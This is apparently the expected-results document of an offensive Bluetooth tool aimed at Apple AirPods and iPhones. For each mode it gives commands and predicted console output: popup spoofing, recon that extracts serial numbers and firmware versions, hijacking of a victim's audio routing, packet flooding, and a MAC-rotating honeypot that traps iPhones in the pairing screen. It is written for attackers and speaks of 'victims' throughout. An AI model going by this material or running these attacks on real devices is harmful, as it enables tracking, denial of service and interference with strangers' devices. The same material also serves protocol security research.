# Expected Test Results

Since testing on real hardware is not possible at the moment, this document outlines the **expected behavioral and console outputs** for each mode of the APRPT tool. These results are based on the protocol analysis and code implementation.

---

## 1. Advertise Mode (Spoofing)
**Command:** `sudo python3 main.py -m advertise`

### Console Output
```text
[*] Mode: advertise
[+] Bluetooth Hardware (hci0) detected successfully.
┏━━━━━━┳━━━━━━━━━━━━━━━━━━━━━┓
┃ ID   ┃ Device Name         ┃
┡━━━━━━╇━━━━━━━━━━━━━━━━━━━━━┩
│ 1    │ AirPods             │
│ 2    │ AirPods Pro         │
│ 3    │ AirPods Max         │
│ ...  │ ...                 │
└──────┴─────────────────────┘
Choose a model ID (default=1): 3
[*] Starting Spoofing (AirPods Max) on hci0...
[*] Broadcasting AirPods Max. Look at your iPhone!
[*] Press Ctrl+C to stop.
```

### Physical/Behavioral Result
*   **Attacker (Terminal)**: Shows a spinning "Earth" animation. This mode is **Broadcasting Only** (Blind). It does **NOT** detect if a user clicks connect.
*   **Victim (iPhone)**:
    *   **Popup**: A white setup animation appears (e.g., "Not Your AirPods Max").
    *   **Action**: Behavior depends on the specific packet type (0x07 Proximity).
    *   **Limitations**: Since advertisements are `ADV_NONCONN_IND` (Non-Connectable) or the advertising interval is purely for flooding, the "Connect" button might be unresponsive or fail immediately if pressed. This mode is best for **Visual Spam** only.

---

## 2. Recon Mode (Metadata Extraction)
**Command:** `sudo python3 main.py -t <TARGET_MAC> -m recon`

### Console Output
```text
[*] Mode: recon
[*] Target: AA:BB:CC:DD:EE:FF
[*] Attempting to connect to AA:BB:CC:DD:EE:FF on PSM 0x1001...
[+] Connected to AA:BB:CC:DD:EE:FF
[*] Starting Metadata Recon...
[*] Sending Handshake...
[>] Sent 16 bytes
[<] Received 16 bytes
[+] Handshake Response: 00000400010002000000000000000000
[*] Sending Notification Subscription...
[>] Sent 6 bytes
[<] Received 6 bytes
[*] Sending Metadata Request (Opcode 0x1d)...
[>] Sent 6 bytes
[<] Received 58 bytes
[+] Raw Metadata: 04001d00...[hex data]...
[i] Decoded String content: AirPods Pro - GX8Z... - 5B58
```

### Analyzed Result
*   **Data Extracted**: You will successfully retrieve:
    *   **Model Name**: e.g., "AirPods Pro"
    *   **Serial Number**: e.g., "GX8Z..." (Useful for tracking or warranty checking simulators)
    *   **Firmware Version**: e.g., "5B58" (Useful for finding known vulnerabilities in specific fw versions)

---

## 3. Hijack Mode (Audio Switching)
**Command:** `sudo python3 main.py -t <TARGET_MAC> -m hijack`

### Console Output
```text
[*] Mode: hijack
[*] Target: AA:BB:CC:DD:EE:FF
[+] Connected to AA:BB:CC:DD:EE:FF
[*] Initiating Smart Routing Hijack...
[*] Sending 'Owns Connection' (0x06 = 0x01)...
[>] Sent 7 bytes
[*] Sending 'Connect Automatically' (0x20 = 0x01)...
[>] Sent 7 bytes
[+] Response received: 04000900...
```

### Physical/Device Behavior
*   **Initial State**: The Victim is listening to music on their iPhone using the AirPods.
*   **Action**: The tool executes the `hijack` command.
*   **Result**: 
    1.  The music on the Victim's iPhone **pauses**.
    2.  The AirPods play the "Connected" chime (a subtle *bloop* sound).
    3.  The audio routing on the AirPods switches to the **Linux Attacker Machine**.
    4.  If the attacker plays audio on Linux, it will now play through the Victim's AirPods.

---

## 4. DoS Mode (Stress Test)
**Command:** `sudo python3 main.py -t <TARGET_MAC> -m dos`

### Console Output
```text
[*] Mode: dos
[*] Target: AA:BB:CC:DD:EE:FF
[+] Connected to AA:BB:CC:DD:EE:FF
[*] Starting Packet Flood (100 packets)...
[*] Sent 0 packets...
[*] Sent 10 packets...
...
[*] Flood complete.
```

## 5. HoneyPot Mode (Victim Trap)
**Command:** `sudo python3 main.py -m honeypot`

### Console Output
```text
[*] Mode: honeypot
[+] Bluetooth Hardware (hci0) detected successfully.
[*] Rotating MAC Address to: c0:1a:2b:3c:4d:5e...
[*] Broadcasting Connectable Signal (HoneyPot Active)...
[*] Waiting for victims to press 'Connect'...

[!] VICTIM CONNECTED: 68:db:f5:xx:xx:xx
[!] STATUS: LOCKED ON
[*] Holding Connection with 68:db:f5:xx:xx:xx (Ctrl+C to stop)...
```

### Physical/Behavioral Result
*   **Attacker (Terminal)**:
    *   **Search Phase**: The terminal shows the MAC address rotating every 15 seconds to bypass iOS caching.
    *   **Attack Phase**: When a victim connects, a **RED ALERT** appears, followed by a **GREEN "LOCKED ON"** status.
*   **Victim (iPhone)**:
    1.  **Popup**: Victim sees the "Not Your AirPods" popup.
    2.  **Interaction**: Victim taps **"Connect"**.
    3.  **Trap**: The screen transitions to **"Hold Button"** (requesting a physical button press).
    4.  **Lock**: Because the attacker system engages "Lock-on" mode, the iPhone remains stuck on this screen. It will **NOT** proceed to "Connected" (success) because we lack the Apple W1/H1 pairing keys.
    5.  **DoS**: The victim is effectively stuck in the setup wizard until they manually close it or disable Bluetooth.
*   **Key Finding**: The "Hold Button" screen is the **maximum achievable state** for a software-based spoofing attack without valid cryptographic keys. Reaching this screen confirms a successful trap.
